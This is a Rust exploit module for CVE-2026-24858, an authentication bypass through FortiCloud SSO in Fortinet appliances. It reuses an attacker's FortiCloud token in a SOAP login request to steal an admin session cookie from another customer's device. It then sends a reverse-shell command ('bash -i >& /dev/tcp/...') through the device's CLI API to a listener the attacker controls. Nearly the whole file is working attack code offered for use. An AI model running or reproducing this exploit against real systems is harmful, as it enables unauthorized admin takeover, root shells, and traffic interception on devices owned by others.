//! # CVE-2026-24858: FortiCloud SSO Authentication Bypass
//!
//! An Authentication Bypass Using an Alternate Path or Channel vulnerability
//! [CWE-288] in Fortinet products with FortiCloud SSO enabled.
//!
//! An attacker with a FortiCloud account (free or paid) can reuse their SSO token
//! to log into other customers' appliances without knowing their passwords.
//!
//! ## Attack Flow
//! 1. Authenticate to FortiCloud API to get access token
//! 2. Build SOAP XML bypass payload with token
//! 3. POST payload to victim's /remote/logincheck
//! 4. Receive APSCOOKIE for admin access
//! 5. Access admin GUI with stolen session
//!
//! ## Affected Products
//! - FortiAnalyzer 7.0.0-7.6.5
//! - FortiManager 7.0.0-7.6.5
//! - FortiOS 7.0.0-7.6.5
//! - FortiProxy 7.0.0-7.6.4
//! - FortiWeb 7.4.0-8.0.3
//!
//! ## Impact
//! - Full admin GUI access
//! - Root shell access
//! - Traffic interception
//! - VPN tampering
//! - Lateral movement
//!
//! ## Reference
//! - https://github.com/absholi7ly/CVE-2026-24858-FortiCloud-SSO-Authentication-Bypass
//! - GHSA-m3cv-5hgp-hv35
//! - FG-IR-26-060

use anyhow::{Context, Result, bail};
use colored::*;
use reqwest::Client;
use serde::Deserialize;
use serde_json::json;
use std::io::Write;
use std::time::Duration;

const FORTICLOUD_AUTH_URL: &str = "https://customerapiauth.fortinet.com/api/v1/auth/token";
const DEFAULT_PORT: u16 = 443;
const REQUEST_TIMEOUT_SECS: u64 = 15;

/// Exploit configuration
#[derive(Debug, Clone)]
struct ExploitConfig {
    target: String,
    port: u16,
    forticloud_username: String,
    forticloud_password: String,
    serial_number: String,
    check_only: bool,
    shell_ip: Option<String>,
    shell_port: Option<u16>,
}

impl Default for ExploitConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            port: DEFAULT_PORT,
            forticloud_username: String::new(),
            forticloud_password: String::new(),
            serial_number: "FGT80ETK21000000".to_string(),
            check_only: false,
            shell_ip: None,
            shell_port: None,
        }
    }
}

#[derive(Debug, Deserialize)]
struct FortiCloudTokenResponse {
    access_token: Option<String>,
    expires_in: Option<u64>,
}

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   CVE-2026-24858: FortiCloud SSO Authentication Bypass            ║".cyan());
    println!("{}", "║   CWE-288: Authentication Bypass Using Alternate Path             ║".cyan());
    println!("{}", "║   Affects FortiAnalyzer/FortiManager/FortiOS/FortiProxy/FortiWeb  ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
}

/// Get user configuration
fn get_user_config(target: &str) -> Result<ExploitConfig> {
    let mut config = ExploitConfig::default();
    
    println!();
    println!("{}", "=== CVE-2026-24858 Configuration ===".yellow().bold());
    println!();
    
    // Target
    config.target = if target.is_empty() {
        print!("{}", "Enter target IP/hostname: ".green());
        std::io::stdout().flush().context("Failed to flush stdout")?;
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).context("Failed to read input")?;
        let t = input.trim().to_string();
        if t.is_empty() {
            bail!("Target is required");
        }
        t
    } else {
        target.to_string()
    };
    
    let mut input = String::new();
    
    // Port
    print!("{}", format!("Target port [default: {}]: ", DEFAULT_PORT).green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if let Ok(p) = input.trim().parse::<u16>() {
        config.port = p;
    }
    
    // FortiCloud username
    print!("{}", "FortiCloud username (attacker account): ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    let username = input.trim().to_string();
    if username.is_empty() {
        bail!("FortiCloud username is required");
    }
    config.forticloud_username = username;
    
    // FortiCloud password
    print!("{}", "FortiCloud password: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    let password = input.trim().to_string();
    if password.is_empty() {
        bail!("FortiCloud password is required");
    }
    config.forticloud_password = password;
    
    // Serial number (optional)
    print!("{}", "Target device serial number [default: FGT80ETK21000000]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if !input.trim().is_empty() {
        config.serial_number = input.trim().to_string();
    }
    
    // Check only mode
    print!("{}", "Check only (no exploitation)? [y/N]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    config.check_only = input.trim().eq_ignore_ascii_case("y");
    
    // Reverse shell (if not check only)
    if !config.check_only {
        print!("{}", "Setup reverse shell connection? [y/N]: ".green());
        std::io::stdout().flush().context("Failed to flush stdout")?;
        input.clear();
        std::io::stdin().read_line(&mut input).context("Failed to read input")?;
        
        if input.trim().eq_ignore_ascii_case("y") {
            print!("{}", "Listener IP: ".green());
            std::io::stdout().flush().context("Failed to flush stdout")?;
            input.clear();
            std::io::stdin().read_line(&mut input).context("Failed to read input")?;
            config.shell_ip = Some(input.trim().to_string());
            
            print!("{}", "Listener port [default: 4444]: ".green());
            std::io::stdout().flush().context("Failed to flush stdout")?;
            input.clear();
            std::io::stdin().read_line(&mut input).context("Failed to read input")?;
            config.shell_port = Some(match input.trim().parse::<u16>() {
                Ok(p) => p,
                Err(_) => 4444,
            });
        }
    }
    
    println!();
    println!("{}", "[Configuration Summary]".cyan().bold());
    println!("  Target: {}:{}", config.target, config.port);
    println!("  FortiCloud User: {}", config.forticloud_username);
    println!("  Serial Number: {}", config.serial_number);
    println!("  Mode: {}", if config.check_only { "Check Only" } else { "Full Exploitation" });
    if let (Some(ip), Some(port)) = (&config.shell_ip, &config.shell_port) {
        println!("  Reverse Shell: {}:{}", ip, port);
    }
    println!();
    
    Ok(config)
}

/// Build SOAP bypass payload
fn build_bypass_payload(token: &str, serial_number: &str) -> String {
    format!(r#"<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <authRequest>
      <serialNumber>{}</serialNumber>
      <token>{}</token>
      <action>login</action>
    </authRequest>
  </soapenv:Body>
</soapenv:Envelope>"#, serial_number, token)
}

/// Get FortiCloud access token
async fn get_forticloud_token(client: &Client, config: &ExploitConfig) -> Result<String> {
    println!("{}", "[*] Authenticating to FortiCloud API...".cyan());
    
    let auth_payload = json!({
        "username": config.forticloud_username,
        "password": config.forticloud_password
    });
    
    let res = client.post(FORTICLOUD_AUTH_URL)
        .json(&auth_payload)
        .send()
        .await
        .context("Failed to connect to FortiCloud API")?;
    
    if !res.status().is_success() {
        let status = res.status();
        let body = match res.text().await {
            Ok(t) => t,
            Err(_) => String::from("(failed to read response)"),
        };
        bail!("FortiCloud auth failed: {} - {}", status, body);
    }
    
    let token_response: FortiCloudTokenResponse = res.json().await
        .context("Failed to parse FortiCloud token response")?;
    
    match token_response.access_token {
        Some(token) => {
            let expires = match token_response.expires_in {
                Some(e) => e,
                None => 900,
            };
            println!("{}", format!("[+] Got FortiCloud token (expires in {}s)", expires).green());
            Ok(token)
        },
        None => bail!("No access_token in FortiCloud response"),
    }
}

/// Attempt authentication bypass
async fn attempt_bypass(client: &Client, config: &ExploitConfig, token: &str) -> Result<Option<String>> {
    let target_url = format!("https://{}:{}/remote/logincheck", config.target, config.port);
    
    println!("{}", format!("[*] Sending bypass payload to {}...", target_url).cyan());
    
    let payload = build_bypass_payload(token, &config.serial_number);
    
    let res = client.post(&target_url)
        .header("Content-Type", "application/xml")
        .body(payload)
        .send()
        .await
        .context("Failed to send bypass request")?;
    
    let status = res.status();
    let cookies: Vec<String> = res.cookies()
        .map(|c| format!("{}={}", c.name(), c.value()))
        .collect();
    
    if status.is_success() {
        // Check for APSCOOKIE
        for cookie in &cookies {
            if cookie.starts_with("APSCOOKIE=") {
                println!("{}", "[+] AUTHENTICATION BYPASS SUCCESSFUL!".green().bold());
                println!("{}", format!("[+] Got session cookie: {}", cookie).green());
                return Ok(Some(cookie.clone()));
            }
        }
        
        // Check response body for success indicators
        let body = match res.text().await {
            Ok(t) => t,
            Err(_) => String::new(),
        };
        
        if body.contains("redir=") || body.contains("login success") || !cookies.is_empty() {
            println!("{}", "[+] AUTHENTICATION BYPASS LIKELY SUCCESSFUL!".green().bold());
            if !cookies.is_empty() {
                let cookie_str = cookies.join("; ");
                println!("{}", format!("[+] Cookies: {}", cookie_str).green());
                return Ok(Some(cookie_str));
            }
        }
        
        println!("{}", format!("[*] Response: {}", status).yellow());
        return Ok(None);
    }
    
    println!("{}", format!("[-] Bypass failed: {}", status).yellow());
    Ok(None)
}

/// Verify admin access
async fn verify_admin_access(client: &Client, config: &ExploitConfig, cookies: &str) -> Result<bool> {
    let admin_url = format!("https://{}:{}/ng/", config.target, config.port);
    
    println!("{}", "[*] Verifying admin GUI access...".cyan());
    
    let res = client.get(&admin_url)
        .header("Cookie", cookies)
        .send()
        .await
        .context("Failed to access admin GUI")?;
    
    if res.status().is_success() {
        let body = match res.text().await {
            Ok(t) => t,
            Err(_) => String::new(),
        };
        
        // Check for admin dashboard indicators
        if body.contains("dashboard") || body.contains("FortiGate") || 
           body.contains("FortiManager") || body.contains("FortiAnalyzer") ||
           body.contains("ng-app") {
            println!("{}", "[+] ADMIN GUI ACCESS CONFIRMED!".green().bold());
            return Ok(true);
        }
    }
    
    println!("{}", "[-] Could not verify admin access".yellow());
    Ok(false)
}

/// Execute reverse shell command
async fn execute_reverse_shell(client: &Client, config: &ExploitConfig, cookies: &str) -> Result<()> {
    let (shell_ip, shell_port) = match (&config.shell_ip, &config.shell_port) {
        (Some(ip), Some(port)) => (ip, port),
        _ => return Ok(()),
    };
    
    println!("{}", "[*] Attempting to execute reverse shell...".cyan());
    println!("{}", format!("[!] Make sure listener is running: nc -lvnp {}", shell_port).yellow());
    
    // FortiOS CLI command execution via API
    let cmd_url = format!("https://{}:{}/api/v2/monitor/system/cli", config.target, config.port);
    
    let shell_cmd = format!("execute bash\nbash -i >& /dev/tcp/{}/{} 0>&1", shell_ip, shell_port);
    
    let payload = json!({
        "command": shell_cmd
    });
    
    let res = client.post(&cmd_url)
        .header("Cookie", cookies)
        .json(&payload)
        .send()
        .await;
    
    match res {
        Ok(r) => {
            if r.status().is_success() {
                println!("{}", "[+] Shell command sent! Check your listener.".green().bold());
            } else {
                println!("{}", format!("[-] Command execution returned: {}", r.status()).yellow());
                println!("{}", "[*] Try manually via GUI: Dashboard → CLI Console → execute bash".cyan());
            }
        },
        Err(e) => {
            println!("{}", format!("[-] Command execution failed: {}", e).yellow());
            println!("{}", "[*] Try manually via GUI: Dashboard → CLI Console".cyan());
        }
    }
    
    Ok(())
}

/// Check if target is vulnerable
async fn check_vulnerable(client: &Client, config: &ExploitConfig) -> Result<bool> {
    let login_url = format!("https://{}:{}/remote/logincheck", config.target, config.port);
    
    println!("{}", "[*] Checking target accessibility...".cyan());
    
    let res = client.get(&login_url)
        .send()
        .await;
    
    match res {
        Ok(r) => {
            let status = r.status();
            let body = match r.text().await {
                Ok(t) => t,
                Err(_) => String::new(),
            };
            
            // Check for FortiOS/FortiGate indicators
            if body.contains("FortiGate") || body.contains("FortiOS") || 
               body.contains("FortiManager") || body.contains("FortiAnalyzer") ||
               body.contains("Fortinet") || body.contains("fgt_") {
                println!("{}", format!("[+] Fortinet device detected: {}", status).green());
                return Ok(true);
            }
            
            // Check for login page
            if body.contains("login") || body.contains("sslvpn") || body.contains("remote") {
                println!("{}", "[+] Target appears to be a Fortinet device".green());
                return Ok(true);
            }
            
            println!("{}", format!("[*] Target responded: {} - may not be Fortinet", status).yellow());
        },
        Err(e) => {
            println!("{}", format!("[-] Could not reach target: {}", e).red());
        }
    }
    
    Ok(false)
}

/// Run the exploit
async fn run_exploit(config: &ExploitConfig) -> Result<()> {
    let client = Client::builder()
        .timeout(Duration::from_secs(REQUEST_TIMEOUT_SECS))
        .danger_accept_invalid_certs(true)
        .build()
        .context("Failed to create HTTP client")?;
    
    // Step 1: Check target
    let is_fortinet = check_vulnerable(&client, config).await?;
    if !is_fortinet {
        print!("{}", "[?] Target may not be a Fortinet device. Continue? [y/N]: ".yellow());
        std::io::stdout().flush().context("Failed to flush stdout")?;
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).context("Failed to read input")?;
        if !input.trim().eq_ignore_ascii_case("y") {
            println!("{}", "[-] Aborted.".red());
            return Ok(());
        }
    }
    
    // Step 2: Get FortiCloud token
    let token = get_forticloud_token(&client, config).await?;
    
    // Step 3: Attempt bypass
    let cookies = attempt_bypass(&client, config, &token).await?;
    
    match cookies {
        Some(ref c) if !c.is_empty() => {
            // Step 4: Verify admin access
            let verified = verify_admin_access(&client, config, c).await?;
            
            if verified && !config.check_only {
                // Step 5: Execute reverse shell if configured
                execute_reverse_shell(&client, config, c).await?;
            }
            
            println!();
            println!("{}", "=== EXPLOIT RESULTS ===".green().bold());
            println!("{}", "[+] Authentication bypass: SUCCESS".green());
            println!("{}", format!("[+] Session cookie: {}", c).green());
            println!("{}", format!("[+] Admin URL: https://{}:{}/ng/", config.target, config.port).cyan());
            println!();
            println!("{}", "Manual exploitation:".yellow());
            println!("  1. Open browser with cookie: {}", c);
            println!("  2. Navigate to: https://{}:{}/ng/", config.target, config.port);
            println!("  3. For shell: Dashboard → CLI Console → execute bash");
            println!();
        },
        _ => {
            println!();
            println!("{}", "=== EXPLOIT RESULTS ===".yellow().bold());
            println!("{}", "[-] Authentication bypass: FAILED or NOT VULNERABLE".red());
            println!();
            println!("{}", "Possible reasons:".yellow());
            println!("  - Target is patched (>= fixed versions)");
            println!("  - FortiCloud SSO is disabled");
            println!("  - Serial number mismatch");
            println!("  - Network/firewall blocking");
            println!();
        }
    }
    
    Ok(())
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    let config = get_user_config(target)?;
    
    println!();
    println!("{}", "[*] Starting exploit...".cyan().bold());
    println!();
    
    run_exploit(&config).await
}
